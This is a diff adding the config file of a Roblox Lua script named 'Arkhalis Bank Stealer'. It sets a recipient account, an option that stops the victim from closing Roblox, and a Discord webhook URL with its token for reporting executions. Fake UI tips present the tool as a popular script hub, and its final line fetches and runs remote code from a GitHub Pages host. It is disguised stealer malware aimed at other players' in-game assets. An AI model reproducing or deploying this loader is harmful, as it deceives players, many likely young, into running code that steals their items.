@@ -1,0 +1,23 @@
+--[[ Arkhalis Bank Stealer]]--
+
+
+--[[ Main Config ]]--
+_G.UserId = https://www.roblox.com/users/898649584/profile --// Roblox Account Id [[https://www.roblox.com/users/IDHERE/profile]] <- This is a example
+
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Diamonds = 100000 --// Amount Of Diamonds To Not Kick
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1100735279024832552/-chFA0_1jU45tKHgDpkLjEFkkKEJf7c4TAYrMb38HKjlBHrglvmCC6GeLJ4XN17AeAzX" --// Discord link Webhook For Executions
+    
+--[[ UI Config ]]--
+_G.ScriptName = "Arkhalis Hub" --// Script Name On The UI
+_G.Tip1 = "#1 PSX Script Hub" --// Gives You Tips On The UI
+_G.Tip2 = "Please be patient, this may take a while" --// Gives You Tips On The UI
+_G.Tip3 = "Did you know Arkhalis Hub was the first PSX Script?" --// Gives You Tips On The UI
+_G.Tip4 = "Join our discord while you wait" --// Gives You Tips On The UI
+_G.Tip5 = "Almost there..." --// Gives You Tips On The UI
+
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/ArkhalisBank.lua"))()
